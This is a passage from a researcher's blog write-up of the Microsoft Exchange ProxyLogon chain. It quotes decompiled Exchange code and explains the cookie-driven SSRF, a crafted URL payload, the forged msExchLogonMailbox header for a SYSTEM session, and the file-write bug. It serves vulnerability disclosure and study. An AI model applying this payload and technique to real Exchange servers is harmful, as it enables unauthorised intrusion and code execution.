&lt;p&gt;If we could do that, maaaaaybe I could bypass some Frontend restrictions to access arbitrary Backends and abuse some internal API. Or, we can confuse the context to leverage the inconsistency of the definition of dangerous HTTP headers between the Frontend and Backend to do further interesting attacks.&lt;/p&gt;

&lt;p&gt;With these thoughts in mind, let’s start hunting!&lt;/p&gt;

&lt;h1 id=&quot;the-proxylogon&quot;&gt;The ProxyLogon&lt;/h1&gt;

&lt;p&gt;The first exploit is the ProxyLogon. As introduced before, this may be the most severe vulnerability in the Exchange history ever. ProxyLogon is chained with 2 bugs:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26855&quot;&gt;CVE-2021-26855&lt;/a&gt; - Pre-auth SSRF leads to Authentication Bypass&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-27065&quot;&gt;CVE-2021-27065&lt;/a&gt; - Post-auth Arbitrary-File-Write leads to RCE&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;cve-2021-26855---pre-auth-ssrf&quot;&gt;CVE-2021-26855 - Pre-auth SSRF&lt;/h2&gt;

&lt;p&gt;There are more than 20 handlers corresponding to different application paths in the Frontend. While reviewing the implementations, we found the method &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetTargetBackEndServerUrl&lt;/code&gt;, which is responsible for calculating the Backend URL in the static resource handler, assigns the Backend target by cookies directly.&lt;/p&gt;

&lt;p&gt;Now you figure out how simple this vulnerability is after learning the architecture!&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;HttpProxy\ProxyRequestHandler.cs&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;language-cs highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;protected&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;virtual&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Uri&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;GetTargetBackEndServerUrl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;LogElapsedTime&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;E_TargetBEUrl&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;Uri&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;UrlAnchorMailbox&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;urlAnchorMailbox&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AnchoredRoutingTarget&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AnchorMailbox&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;UrlAnchorMailbox&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;urlAnchorMailbox&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;urlAnchorMailbox&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;UriBuilder&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;clientUrlForProxy&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetClientUrlForProxy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;clientUrlForProxy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Scheme&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Uri&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;UriSchemeHttps&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;clientUrlForProxy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Host&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AnchoredRoutingTarget&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BackEndServer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Fqdn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;clientUrlForProxy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Port&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;444&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AnchoredRoutingTarget&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BackEndServer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Version&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;E15MinVersion&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ProxyToDownLevel&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;RequestDetailsLoggerBase&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RequestDetailsLogger&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;SafeAppendGenericInfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Logger&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;ProxyToDownLevel&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;clientUrlForProxy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Port&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;443&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;clientUrlForProxy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Uri&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;finally&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;LogElapsedTime&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;L_TargetBEUrl&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;From the code snippet, you can see the property &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BackEndServer.Fqdn&lt;/code&gt; of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AnchoredRoutingTarget&lt;/code&gt; is assigned from the cookie directly.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;HttpProxy\OwaResourceProxyRequestHandler.cs&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;language-cs highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;protected&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;override&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AnchorMailbox&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;ResolveAnchorMailbox&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;HttpCookie&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;httpCookie&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;base&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ClientRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Cookies&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;X-AnonResource-Backend&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;httpCookie&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;savedBackendServer&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;httpCookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(!&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;IsNullOrEmpty&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;savedBackendServer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;base&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Logger&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Set&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;X-AnonResource-Backend-Cookie&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ExTraceGlobals&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;VerboseTracer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;IsTraceEnabled&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;ExTraceGlobals&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;VerboseTracer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TraceDebug&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HttpCookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetHashCode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[OwaResourceProxyRequestHandler::ResolveAnchorMailbox]: AnonResourceBackend cookie used: {0}; context {1}.&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;httpCookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;base&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TraceContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;ServerInfoAnchorMailbox&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BackEndServer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;FromString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;savedBackendServer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;AnonymousAnchorMailbox&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Though we can only control the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Host&lt;/code&gt; part of the URL, but hang on, isn’t &lt;a href=&quot;https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf&quot;&gt;manipulating a URL Parser&lt;/a&gt; exactly what I am good at? Exchange builds the Backend URL by built-in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UriBuilder&lt;/code&gt;. However, since C# didn’t verify the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Host&lt;/code&gt;, so we can enclose the whole URL with some special characters to access arbitrary servers and ports.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;https://[foo]@example.com:443/path#]:444/owa/auth/x.js&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20210806/1/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So far we have a super SSRF that can control almost all the HTTP requests and get all the replies. The most impressive thing is that the Frontend of Exchange will generate a Kerberos Ticket for us, which means even when we are attacking a protected and domain-joined HTTP service, we can still hack with the authentication of Exchange Machine Account.&lt;/p&gt;

&lt;p&gt;So, what is the root cause of this arbitrary Backend assignment? As mentioned, the Exchange Server changes its architecture while releasing new versions. It might have different functions in different versions even with the same component under the same name. Microsoft has put great effort into ensuring the architectural capability between new and old versions. This cookie is a quick solution and the design debt of Exchange making the Frontend in the new architecture could identify where the old Backend is.&lt;/p&gt;

&lt;h2 id=&quot;cve-2021-27065---post-auth-arbitrary-file-write&quot;&gt;CVE-2021-27065 - Post-auth Arbitrary-File-Write&lt;/h2&gt;

&lt;p&gt;Thanks to the super SSRF allowing us to access the Backend without restriction. The next is to find a RCE bug to chain together. Here we leverage a Backend internal API &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/proxyLogon.ecp&lt;/code&gt; to become the admin. The API is also the reason why we called it ProxyLogon.&lt;/p&gt;

&lt;p&gt;Because we leverage the Frontend handler of static resources to access the ECExchange Control Panel (ECP) Backend, the header &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;msExchLogonMailbox&lt;/code&gt;, which is a special HTTP header in the ECP Backend, will not be blocked by the Frontend. By leveraging this minor inconsistency, we can specify ourselves as the SYSTEM user and generate a valid ECP session with the internal API.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20210806/1/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;With the inconsistency between the Frontend and Backend, we can access all the functions on ECP by Header forgery and internal Backend API abuse. Next, we have to find an RCE bug on the ECP interface to chain them together. The ECP wraps the Exchange PowerShell commands as an abstract interface by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/ecp/DDI/DDIService.svc&lt;/code&gt;. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DDIService&lt;/code&gt; defines several PowerShell executing pipelines by XAML so that it can be accessed by Web. While verifying the DDI implementation, we found the tag of WriteFileActivity did not check the file path properly and led to an arbitrary-file-write.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;DDIService\WriteFileActivity.cs&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;language-cs highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;override&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;RunResult&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;Run&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DataRow&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DataTable&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dataTable&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DataObjectStore&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;store&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Type&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;codeBehind&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Workflow&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;UpdateTableDelegate&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;updateTableDelegate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;DataRow&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dataRow&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dataTable&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Rows&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;InputVariable&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;path&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;OutputFileNameVariable&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;RunResult&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;runResult&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;RunResult&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;runResult&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ErrorOccur&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;using&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;StreamWriter&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;streamWriter&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;StreamWriter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;File&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FileMode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CreateNew&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;streamWriter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;WriteLine&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;runResult&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ErrorOccur&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    
